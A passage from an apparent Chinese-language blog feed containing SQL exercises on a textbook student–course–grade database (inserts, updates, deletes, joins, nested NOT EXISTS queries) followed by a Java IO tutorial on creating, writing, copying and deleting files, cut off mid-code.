STUDENT(SNO,SNAME,SSEX,SAGE,SDEPT) values(200215121,<span class="string">&#x27;李勇&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,20,<span class="string">&#x27;CS&#x27;</span>);</span><br><span class="line">insert into STUDENT(SNO,SNAME,SSEX,SAGE,SDEPT) values(200215122,<span class="string">&#x27;刘晨&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,19,<span class="string">&#x27;CS&#x27;</span>);</span><br><span class="line">insert into STUDENT(SNO,SNAME,SSEX,SAGE,SDEPT) values(200215123,<span class="string">&#x27;王敏&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,18,<span class="string">&#x27;MA&#x27;</span>);</span><br><span class="line">insert into STUDENT(SNO,SNAME,SSEX,SAGE,SDEPT) values(200215125,<span class="string">&#x27;张立&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,19,<span class="string">&#x27;IS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记得先把COURSE表中的外键约束关了，否则数据插不进去</span></span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(1,<span class="string">&#x27;数据库&#x27;</span>,5,4);</span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(2,<span class="string">&#x27;数学&#x27;</span>,null,2);</span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(3,<span class="string">&#x27;信息系统&#x27;</span>,1,4);</span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(4,<span class="string">&#x27;操作系统&#x27;</span>,6,3);</span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(5,<span class="string">&#x27;数据结构&#x27;</span>,7,4);</span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(6,<span class="string">&#x27;数据处理&#x27;</span>,null,2);</span><br><span class="line">insert into COURSE(CNO,CNAME,CPNO,CCREDIT) values(7,<span class="string">&#x27;PASCAL语言&#x27;</span>,6,4);</span><br><span class="line"></span><br><span class="line">insert into SC(SNO,CNO,GRADE) values(200215121,1,92);</span><br><span class="line">insert into SC(SNO,CNO,GRADE) values(200215121,2,85);</span><br><span class="line">insert into SC(SNO,CNO,GRADE) values(200215121,3,88);</span><br><span class="line">insert into SC(SNO,CNO,GRADE) values(200215122,4,90);</span><br><span class="line">insert into SC(SNO,CNO,GRADE) values(200215122,3,80);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.修改数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1）将王敏的同学的年龄改为20。</span><br><span class="line"></span><br><span class="line">update STUDENT <span class="built_in">set</span> sage=20 <span class="built_in">where</span> sname=<span class="string">&#x27;王敏&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）将全部同学的年龄加1。</span><br><span class="line"></span><br><span class="line">update STUDENT <span class="built_in">set</span> sage=sage+1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3）将’CS’系同学的选课信息中的成绩置0。</span><br><span class="line"></span><br><span class="line">update SC <span class="built_in">set</span> grade=0 <span class="built_in">where</span> sno <span class="keyword">in</span> </span><br><span class="line">(</span><br><span class="line">    select sc.sno from STUDENT join SC on(student.sno=sc.sno)</span><br><span class="line">    <span class="built_in">where</span> sdept=<span class="string">&#x27;CS&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>3.删除数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1）删除和’刘晨’在同一个系的学生的信息。（包括刘晨自己也会被删除）</span><br><span class="line"></span><br><span class="line">delete from STUDENT <span class="built_in">where</span> sdept <span class="keyword">in</span></span><br><span class="line">(</span><br><span class="line">    select sdept from STUDENT</span><br><span class="line">    <span class="built_in">where</span> sname=<span class="string">&#x27;刘晨&#x27;</span></span><br><span class="line">);</span><br><span class="line">然后发现删除不了，因为有外键约束，SC表依赖当前表的SNO，</span><br><span class="line">所以要先删掉SC表中SNO的外键约束alter table sc drop constraint SYS_C0051208;</span><br><span class="line">再执行删除语句即可。</span><br><span class="line"></span><br><span class="line">2）删除’CS’系同学的选课信息。</span><br><span class="line"></span><br><span class="line">delete from SC <span class="built_in">where</span> sno <span class="keyword">in</span></span><br><span class="line">(</span><br><span class="line">    select sno from STUDENT</span><br><span class="line">    <span class="built_in">where</span> sdept=<span class="string">&#x27;CS&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>三、数据查询（select）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">1.包括排序、分组的单表查询</span><br><span class="line">（1）求数学系学生的学号和姓名。</span><br><span class="line"></span><br><span class="line">select sno,sname from student where sdept=&#x27;MA&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（2）求选修了课程的学生学号。</span><br><span class="line"></span><br><span class="line"># 学号distinct去重，因为SC表中学号可以重复，一个学号可选多门课</span><br><span class="line"></span><br><span class="line">select distinct sno from sc; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（3）求选修课程号为‘2’的学生号和成绩，并要求对查询结果按成绩的降序排列，如果成绩相同按学号的升序排列。</span><br><span class="line"></span><br><span class="line">select sno,grade from sc where cno=2 order by grade DESC,sno ASC;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（4）求选修课程号为’2’且成绩在80～90之间的学生学号和成绩，并将成绩乘以0.8输出。</span><br><span class="line"></span><br><span class="line">select sno,grade*0.8 from sc where cno=2 and grade&gt;=80 and grade&lt;=90;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（5）求数学系或计算机系姓张的学生的信息。</span><br><span class="line"></span><br><span class="line"># 注意and的优先级高于or，加一个括号即可</span><br><span class="line"></span><br><span class="line">select * from student where sname like &#x27;张%&#x27; and (sdept=&#x27;MA&#x27; or sdept=&#x27;CS&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（6）求缺少了成绩的学生的学号和课程号。</span><br><span class="line"></span><br><span class="line">select sno,cno from sc where grade is null;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（7）查询各个课程号与相应的选课人数。</span><br><span class="line"></span><br><span class="line">select cno,count(*) from sc group by cno;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.多表连接查询</span><br><span class="line">（1）查询每个学生的情况以及他所选修的课程。</span><br><span class="line"></span><br><span class="line">select student.sno,sname,ssex,sdept,cno from student,sc where student.sno=sc.sno;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（2）求学生的学号、姓名、选修的课程及成绩。</span><br><span class="line"></span><br><span class="line">select student.sno,sname,cno,grade from student,sc where student.sno=sc.sno;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（3）求选修课程号为‘1’且成绩在90分以上的学生学号、姓名和成绩。</span><br><span class="line"></span><br><span class="line">select student.sno,sname,grade from student,sc where student.sno=sc.sno and cno=1 and grade&gt;=90;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（4）查询每一门课程的间接先行课。</span><br><span class="line"></span><br><span class="line">select c1.cno,c2.cpno from course c1,course c2 where c1.cpno=s2.cno;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（5）查询与’刘晨’在同一个系学习的学生。</span><br><span class="line"></span><br><span class="line">select s1.sno,s1.sname,s1.sage,s1.ssex,s1.sdept </span><br><span class="line">from student s1,student s2 </span><br><span class="line">where s1.sdept=s2.sdept and s2.sname=&#x27;刘晨&#x27;; #两个相同的表通过sdept连接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（6）查询选修了课程名为‘信息系统‘的学生学号和姓名。</span><br><span class="line"></span><br><span class="line">select sc.sno,sname from student,sc,course </span><br><span class="line">where student.sno=sc.sno and sc.cno=course.cno and cname=&#x27;信息系统&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（7）查询平均成绩在80分以上的学生学号和平均成绩。</span><br><span class="line"></span><br><span class="line">select sno,avg(grade) from sc group by sno having avg(grade)&gt;=80;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（8）查询选修了1门以上课程的学生的学号。</span><br><span class="line"></span><br><span class="line">select sno from sc group by sno having count(*)&gt;1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.嵌套查询</span><br><span class="line">（1）求选修了信息系统的学号和姓名。</span><br><span class="line"></span><br><span class="line">select sno,sname from student where sno in</span><br><span class="line">(</span><br><span class="line">    select sno from sc where cno in </span><br><span class="line">    (</span><br><span class="line">        select cno from course </span><br><span class="line">        where cname=&#x27;信息系统&#x27;</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">（2）查询与刘晨在同一个系学习的学生。</span><br><span class="line"></span><br><span class="line">select * from student where sdept in</span><br><span class="line">(</span><br><span class="line">select sdept from student </span><br><span class="line">where sname=&#x27;刘晨&#x27;</span><br><span class="line">);</span><br><span class="line">（3）求选修1号课程的成绩高于刘晨的成绩（指刘晨选修的所有的课程的成绩）的学生学号及成绩。</span><br><span class="line"></span><br><span class="line">select sno,grade from sc where cno=1 and grade &gt;</span><br><span class="line">(</span><br><span class="line">    select max(grade) from sc where sno in</span><br><span class="line">    (</span><br><span class="line">        select sno from student</span><br><span class="line">        where sname=&#x27;刘晨&#x27;</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">（4）求其他系中比计算机系某一学生年龄小的学生（即年龄小于计算机系年龄最大者的学生）。</span><br><span class="line"></span><br><span class="line">select * from student where sage &lt;</span><br><span class="line">(</span><br><span class="line">    select max(sage) from student </span><br><span class="line">    where sdept=&#x27;CS&#x27;</span><br><span class="line">);</span><br><span class="line">（5）求其他系中比计算机系学生年龄都小的学生姓名及年龄。</span><br><span class="line"></span><br><span class="line">select sname,sage from student where sage &lt;</span><br><span class="line">(</span><br><span class="line">    select min(sage) from student </span><br><span class="line">    where sdept=&#x27;CS&#x27;</span><br><span class="line">);</span><br><span class="line">（6）求选修课程超过2门的学生的学号和姓名。</span><br><span class="line"></span><br><span class="line">select sno,sname from student where sno in</span><br><span class="line">(</span><br><span class="line">    select sno from sc</span><br><span class="line">    group by sno having count(*)&gt;2</span><br><span class="line">);</span><br><span class="line">（7）求没有选修3号课程的学生姓名。</span><br><span class="line"></span><br><span class="line">select sname from student where not exists </span><br><span class="line">(</span><br><span class="line">    select * from sc</span><br><span class="line">    where cno=3 and student.sno=sc.sno</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（8）查询选修了全部课程的学生姓名。【重点！】</span><br><span class="line"></span><br><span class="line">select sname from student where not exists </span><br><span class="line">(</span><br><span class="line">    select * from course where not exists</span><br><span class="line">    (</span><br><span class="line">        select * from sc</span><br><span class="line">        where sc.cno=course.cno and sc.sno=student.sno</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">分析：</span><br><span class="line">这个比较难懂，我们先看看内两层查询，表示选出当前学号（比如说122）没选的课</span><br><span class="line"></span><br><span class="line">select * from course where not exists</span><br><span class="line">(</span><br><span class="line">    select * from sc</span><br><span class="line">    where sc.cno=course.cno and sc.sno=200215122</span><br><span class="line">); </span><br><span class="line">如果这个结果是空，表示当前学号（比如说122）没选的课为空，最外层加一个select sname from student where not exists，表示选出所有 没有没选的课 的学生。</span><br><span class="line"></span><br><span class="line">可以将not exists当作“减法”理解，内两层的意思就是把所有的课减去122学号选的课，如果为空（所有的课被122选的课给减没了），那么就选出122来。</span><br><span class="line"></span><br><span class="line">（9）求至少选修了学号为“200215121”的学生所选修全部课程的学生学号和姓名。【重点！】</span><br><span class="line">分析：</span><br><span class="line">先选出121学生选的课 减去 122学生选的课：</span><br><span class="line"></span><br><span class="line">select * from sc sc1 where sno=200215121 and not exists</span><br><span class="line">(</span><br><span class="line">    select * from sc sc2</span><br><span class="line">    where sc1.cno=sc2.cno and sc2.sno=200215122</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">单纯的只有where not exist表示选出空的。</span><br><span class="line">以上的整个式子表示减法：最内层用cno连接，表示找选课记录，然后121选课集合减去122选课集合。</span><br><span class="line"></span><br><span class="line">过程的话实际就是两层for循环遍历，for(i: 121选课)&#123;for (j: 122选课)&#125;，对于每个i，判断122选课中是否存在j满足i.cno=j.cno，如果有，不为空，那么not exists就不选出这个i，实际上这不就相当于当前遍历到的i的记录被相同的j减去了吗！而且外层循环是121选课，说明最终输出的答案只能是121选课的子集，只要答案为空我们就把他选出来！</span><br><span class="line"></span><br><span class="line">如果为空，说明122这个学号把121的所有课都选了（所以121的课被减没了）。</span><br><span class="line">还有一种情况，就是122这个学号不仅把121的所有课都选了，他还选了其他课，这个时候的减法结果不是按“负数”理解，就理解成122把121的所有课都减没了，他还剩了多余的课，那是122的选课集合剩了(不是121剩了)，最主要的是121被减没了，所以121的选课集合答案是空。</span><br><span class="line"></span><br><span class="line">绕了这么多，反正核心就是：</span><br><span class="line">找一个学生的选课集合作为“减数”，如果他大于等于121的选课集合，那么121的选课集合减去他之后就能变成空，这个“减数”就是我们要找的。</span><br><span class="line"></span><br><span class="line">最后，把学号122改成变量，加一个最外层查询遍历所有学生，</span><br><span class="line">因为找到为空的就要把他选出来，所以最外层写not exists选出空的，那么整个答案就是：</span><br><span class="line"></span><br><span class="line">select sno,sname from student where not exists</span><br><span class="line">(</span><br><span class="line">    select * from sc sc1 where sno=200215121 and not exists</span><br><span class="line">    (</span><br><span class="line">        select * from sc sc2</span><br><span class="line">        where sc1.cno=sc2.cno and sc2.sno=student.sno</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java IO流的基本使用</title>
      <link href="/2021/12/31/Java-IO%E6%B5%81%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/12/31/Java-IO%E6%B5%81%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>创建目录及文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 基于指定文件名称创建目录及文件</span><br><span class="line"> * 如果文件已经存在，则忽略</span><br><span class="line"> *</span><br><span class="line"> * @param fileName</span><br><span class="line"> * @throws IOException </span><br><span class="line"> */</span><br><span class="line">private static void createFile(String fileName) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Path dir = Paths.get(fileName);</span><br><span class="line">Files.createDirectories(dir.getParent());// 创建目录，存在目录也不会抛出异常</span><br><span class="line">try&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Files.createFile(dir);// 创建文件，若文件已经存在则会抛出异常</span><br><span class="line">System.out.println(<span class="string">&quot;创建文件成功！文件位置：&quot;</span> + fileName);</span><br><span class="line">&#125;</span><br><span class="line">catch(FileAlreadyExistsException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">System.out.println(<span class="string">&quot;文件 &quot;</span> + fileName + <span class="string">&quot; 已存在，无需创建！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入文件（基于Files.write或者BufferedWriter）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 提示：文件以字节操作，因此可以</span><br><span class="line"> * 字符串，转字节数组，直接基于Files写入文件</span><br><span class="line"> * </span><br><span class="line"> * @param fileName</span><br><span class="line"> * @param content</span><br><span class="line"> * @throws IOException </span><br><span class="line"> */</span><br><span class="line">static void write(String target, String content) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">byte[] buffer = content.getBytes();</span><br><span class="line">Path p = Paths.get(target);</span><br><span class="line">try &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Files.write(p, buffer); // 默认是覆盖内容</span><br><span class="line">//Files.write(p, buffer, StandardOpenOption.APPEND); // 添加内容</span><br><span class="line">System.out.println(<span class="string">&quot;数据写入成功！文件位置：&quot;</span> + target);</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者可以用直接用的BufferedWriter：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private static void writeToFile(String fileName, String content) throws IOException&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">String[] lines = content.split(&quot;\r\n&quot;); // 先把要写入的字符串按行分割</span><br><span class="line">try( BufferedWriter output = new BufferedWriter(new FileWriter(fileName)); ) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">for (String line: lines) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">output.write(line); // 写入一行(不含换行符)</span><br><span class="line">output.newLine(); // 写入换行符</span><br><span class="line">&#125;</span><br><span class="line">output.flush();</span><br><span class="line">System.out.println(&quot;数据写入成功！文件位置：&quot; + fileName);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>基于基本IO复制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 基于基本IO，以及字节数组缓冲区，复制文件</span><br><span class="line"> * 打印显示循环读写循环次数</span><br><span class="line"> *</span><br><span class="line"> * @param sourceFile</span><br><span class="line"> * @param targetFile</span><br><span class="line"> * @throws IOException </span><br><span class="line"> */</span><br><span class="line">private static void copyByIO(String sourceFile, String targetFile) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">try( InputStream input = new FileInputStream(sourceFile);</span><br><span class="line">     OutputStream output = new FileOutputStream(targetFile); )&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">int size = 4;</span><br><span class="line">byte[] buffer = new byte[size]; // 字节数组缓冲区，大小为size</span><br><span class="line">int len;</span><br><span class="line">int cnt = 0;</span><br><span class="line"><span class="keyword">while</span>( (len = input.read(buffer)) != -1) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">output.write(buffer, 0, len);</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sourceFile + <span class="string">&quot; -&gt; &quot;</span> + targetFile + <span class="string">&quot; 复制成功！&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;字节数组缓冲区大小为&quot;</span> + size + <span class="string">&quot;时，读写循环次数为&quot;</span> + cnt + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于NIO复制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 基于NIO，实现文件的复制</span><br><span class="line"> *</span><br><span class="line"> * @param sourceFile</span><br><span class="line"> * @param targetFile</span><br><span class="line"> * @throws IOException </span><br><span class="line"> */</span><br><span class="line">private static void copyByNIO(String sourceFile, String targetFile) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Path <span class="built_in">source</span> = Paths.get(sourceFile);</span><br><span class="line">Path target = Paths.get(targetFile);</span><br><span class="line">Files.createDirectories(target.getParent());</span><br><span class="line">Files.copy(<span class="built_in">source</span>, target, StandardCopyOption.REPLACE_EXISTING); // 如果输出文件存在，则替换</span><br><span class="line">System.out.println(sourceFile + <span class="string">&quot; -&gt; &quot;</span> + targetFile + <span class="string">&quot; 复制成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 删除文件</span><br><span class="line"> *</span><br><span class="line"> * @param fileName</span><br><span class="line"> * @throws IOException </span><br><span class="line"> */</span><br><span class="line">private static void deleteFile(String fileName) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Path dir = Paths.get(fileName);</span><br><span class="line">Files.deleteIfExists(dir);</span><br><span class="line">System.out.println(fileName + <span class="string">&quot; 删除成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归遍历指定目录下所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 遍历打印指定目录下全部目录/文件名称</span><br><span class="line"> *</span><br><span class="line"> * @param dir</span><br><span class="line"> * @throws IOException </span><br><span class="line"> 